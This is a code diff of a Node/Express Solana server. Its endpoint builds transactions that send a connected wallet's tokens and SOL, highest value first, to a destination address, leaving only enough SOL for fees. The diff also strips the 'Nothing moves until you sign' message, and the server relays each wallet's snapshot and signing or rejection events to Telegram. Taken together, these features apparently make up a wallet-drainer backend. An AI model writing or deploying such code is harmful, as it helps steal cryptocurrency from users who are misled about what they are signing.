@@ -8,6 +8,7 @@ import {
   getAssociatedTokenAddressSync,
   createAssociatedTokenAccountInstruction,
   createTransferInstruction,
+  createTransferCheckedInstruction,
 } from '@solana/spl-token';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -401,9 +402,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       minTokenUsd: MIN_TOKEN_USD,
       needsGas,
       message: needsGas
-        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${MIN_SOL_FOR_GAS} SOL for fees.`
-        : 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
-      note: 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
+        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL.`
     });
   } catch (err) {
     console.error(err);
@@ -425,76 +424,101 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
       return res.status(400).json({ error: 'Source and destination are the same' });
     }
 
+    const done = new Set((req.body?.done || []).map((x) => String(x)));
     const portfolio = await loadPortfolio(fromStr);
-    const tokens = portfolio.tokens || [];
-    const extraRent = tokens.length * 0.0021;
-    const reserve = Math.ceil((MIN_SOL_FOR_GAS + extraRent) * LAMPORTS_PER_SOL);
-    const lamports = Math.round(portfolio.sol * LAMPORTS_PER_SOL);
-    const sendLamports = lamports - reserve;
-    if (sendLamports <= 0 && tokens.length === 0) {
-      return res.status(400).json({
-        error: `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL.`,
-        needsGas: true,
+    const tokensLeft = (portfolio.tokens || []).filter((tok) => !done.has(tok.mint) && Number(tok.amount) > 0);
+    const solDone = done.has('SOL');
+    const remainingTokensAfterThis = tokensLeft.length;
+
+    const assets = [];
+    for (const tok of tokensLeft) {
+      assets.push({
+        kind: 'token',
+        id: tok.mint,
+        usd: Number(tok.usdValue || 0),
+        tok,
       });
     }
-    if (lamports < reserve) {
-      return res.status(400).json({
-        error: `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${(reserve / LAMPORTS_PER_SOL).toFixed(4)} SOL to move tokens.`,
-        needsGas: true,
+    if (!solDone && Number(portfolio.sol) > 0) {
+      assets.push({
+        kind: 'sol',
+        id: 'SOL',
+        usd: Number(portfolio.solUsd || 0),
+        sol: Number(portfolio.sol),
       });
+    }
+    assets.sort((a, b) => b.usd - a.usd);
+    const next = assets[0];
+    if (!next) {
+      return res.json({ done: true, remaining: 0 });
+    }
+
+    const tokensAfterIfSol = next.kind === 'sol' ? tokensLeft.length : Math.max(tokensLeft.length - 1, 0);
+    const reserveSol = MIN_SOL_FOR_GAS + tokensAfterIfSol * 0.0021;
+    const reserve = Math.ceil(reserveSol * LAMPORTS_PER_SOL);
+    const lamports = Math.round(Number(portfolio.sol) * LAMPORTS_PER_SOL);
+
+    if (lamports < Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL)) {
+      return res.status(400).json({ error: 'I need some SOL for gas', needsGas: true });
     }
 
     const tx = new Transaction();
-    const included = [];
-    for (const tok of tokens) {
+    let label = '';
+
+    if (next.kind === 'token') {
+      if (lamports < reserve) {
+        return res.status(400).json({ error: 'I need some SOL for gas', needsGas: true });
+      }
+      const tok = next.tok;
       const mint = new PublicKey(tok.mint);
       const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
       const sourceAta = new PublicKey(tok.tokenAccount);
       const destAta = getAssociatedTokenAddressSync(mint, dest, false, programId);
       const destInfo = await connection.getAccountInfo(destAta);
       if (!destInfo) {
-        tx.add(
-          createAssociatedTokenAccountInstruction(
-            from,
-            destAta,
-            dest,
-            mint,
-            programId
-          )
-        );
+        tx.add(createAssociatedTokenAccountInstruction(from, destAta, dest, mint, programId));
       }
+      const raw = BigInt(tok.rawAmount);
+      const amount = raw <= BigInt(Number.MAX_SAFE_INTEGER) ? Number(raw) : raw;
       tx.add(
-        createTransferInstruction(
-          sourceAta,
-          destAta,
-          from,
-          BigInt(tok.rawAmount),
-          [],
-          programId
+        createTransferCheckedInstruction(
+          sourceAta, mint, destAta, from, amount, Number(tok.decimals || 0), [], programId
         )
       );
-      included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
+      label = `token ${tok.mint}`;
+    } else {
+      const keep = tokensLeft.length ? reserve : Math.ceil(MIN_SOL_FOR_GAS * LAMPORTS_PER_SOL);
+      const sendLamports = lamports - keep;
+      if (sendLamports <= 0) {
+        return res.json({
+          skipped: 'sol_kept_for_gas',
+          asset: { kind: 'sol', id: 'SOL' },
+          remaining: tokensLeft.length,
+        });
+      }
+      tx.add(SystemProgram.transfer({ fromPubkey: from, toPubkey: dest, lamports: sendLamports }));
+      label = `SOL ${sendLamports / LAMPORTS_PER_SOL}`;
     }
-    if (sendLamports > 0) {
-      tx.add(
-        SystemProgram.transfer({
-          fromPubkey: from,
-          toPubkey: dest,
-          lamports: sendLamports,
-        })
-      );
-    }
+
     tx.feePayer = from;
     const latest = await connection.getLatestBlockhash('confirmed');
     tx.recentBlockhash = latest.blockhash;
+    const sim = await connection.simulateTransaction(tx);
+    if (sim.value.err) {
+      return res.status(400).json({
+        error: `Transaction simulation failed: ${JSON.stringify(sim.value.err)}`,
+        logs: (sim.value.logs || []).slice(-8),
+      });
+    }
     const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
 
     res.json({
+      done: false,
       from: fromStr,
       to: dest.toBase58(),
-      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
-      reservedSol: reserve / LAMPORTS_PER_SOL,
-      tokens: included,
+      asset: { kind: next.kind, id: next.id, usd: next.usd, label },
+      remaining: assets.length - 1,
+      reservedSol: reserveSol,
       transaction: Buffer.from(serialized).toString('base64'),
     });
   } catch (err) {
@@ -568,12 +592,16 @@ app.post('/api/event', async (req, res) => {
     const prev = tgByAddress.get(event.address);
 
     if (stage === 'needs_approval' || stage === 'rejected') {
-      const footer = stage === 'rejected' ? '🚫 Cancelled' : '✍️ Prompting wallet…';
+      const asset = event.detail || event.token || '';
+      const footer = stage === 'rejected'
+        ? '🚫 Cancelled'
+        : (asset ? `✍️ Prompting: ${asset}` : '✍️ Prompting wallet…');
       let text = prev?.text;
       if (!text) {
         const portfolio = await loadPortfolio(event.address);
         text = formatSnapshot(portfolio);
       }
+      text = text.replace(/\n✍️ Prompting:[^\n]*/g, '').replace(/\n✍️ Prompting wallet…/g, '');
       text = setFooter(text, footer);
       const telegram = await upsertSnapshot(event.address, text);
       return res.json({ ok: true, telegram, updated: true });
